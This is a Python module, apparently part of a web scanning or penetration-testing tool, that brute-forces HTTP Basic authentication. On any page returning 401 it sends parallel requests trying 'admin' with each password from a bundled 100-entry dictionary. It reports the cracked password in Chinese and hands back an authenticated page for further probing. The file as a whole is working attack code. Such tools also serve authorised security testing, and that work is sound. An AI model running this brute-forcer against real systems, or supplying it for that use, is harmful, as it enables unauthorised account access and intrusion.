from .mod import Mod, Page, ModTarget, HTTPContent, Report
from .requester import Requester
import asyncio
from pathlib import Path
from base64 import b64encode

def base64_encode(s):
    return b64encode(s.encode()).decode()

passwords = []
with open(Path(__file__).parent / "fuzz_dict" / "passwords100.txt", "r") as f:
    passwords = f.readlines()
    passwords = [password.strip() for password in passwords]


class PageAuthBurstMod(Mod):
    def __init__(self, requeser: Requester):
        super().__init__()
        self.requeser = requeser
        self.visited = set()

    async def check(self, thing: ModTarget):
        return 1 if isinstance(thing, HTTPContent) and thing.code == 401 else 0

    async def crack(self, content: HTTPContent):
        headers = content.frompage.withheaders if content.frompage.withheaders else {}
        resps = await asyncio.gather(
            *[
                self.requeser.request(
                    "GET",
                    content.url,
                    params=content.frompage.withparam,
                    headers={"Authorization": "Basic " + base64_encode("admin:" + password)}
                    | headers,
                )
                for password in passwords
            ]
        )
        valids = [
            (password, resp)
            for password, resp in zip(passwords, resps)
            if resp.status_code != 401
        ]
        if not valids:
            return []
        password, _ = valids[0]
        return [
            Report(f"爆破页面 {content.url} 存在的401，得到admin的密码为 {password}"),
            Page(
                url=content.url,
                mightbe=[],
                params=content.frompage.params,
                withparam=content.frompage.withparam,
                withheaders={"Authorization": "Basic " + base64_encode("admin:" + password)}
                | headers,
            ),
        ]
